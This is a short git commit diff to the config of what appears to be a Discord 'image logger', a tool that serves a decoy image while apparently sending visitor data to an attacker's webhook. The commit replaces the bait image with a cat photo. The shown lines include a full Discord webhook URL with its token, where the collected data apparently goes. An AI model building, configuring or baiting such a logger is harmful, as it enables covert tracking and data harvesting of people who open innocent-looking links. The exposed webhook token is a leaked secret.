357ad35b03d5e007436f9660cea72d3eba92c2f2
white-1k2 <afy56699@gmail.com>
2025-11-13 14:32:47 +0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1438483499622338611/_fvVAyMIjSnZxtzRPG7nqHeyUxOvHp7DKdGvO3jIl0ZgYzjcgxwlV9ULDQsK6xa5Ktba",
-    "image": "https://i0.wp.com/learn.onemonth.com/wp-content/uploads/2017/08/1-10.png?fit=845%2C503&ssl=1", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.pixabay.com/photo/2024/02/28/07/42/european-shorthair-8601492_640.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
